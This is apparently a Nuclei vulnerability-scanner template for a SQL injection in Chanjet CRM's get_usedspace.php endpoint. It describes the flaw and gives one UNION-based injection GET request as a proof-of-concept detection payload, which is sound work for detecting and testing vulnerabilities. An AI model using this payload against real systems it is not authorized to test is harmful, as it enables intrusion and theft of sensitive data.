# Nuclei Template: Chanjet CRM - SQL Injection
**Template ID:** chanjet-crm-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`chanjet-crm-sqli.yaml`)

## Vulnerability Information & PoC

## Description
SQL injection exists in the Chanjet CRM get_usedspace.php, and sensitive information can be obtained through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{num}}))
```

## References
- https://www.chanjet.com/
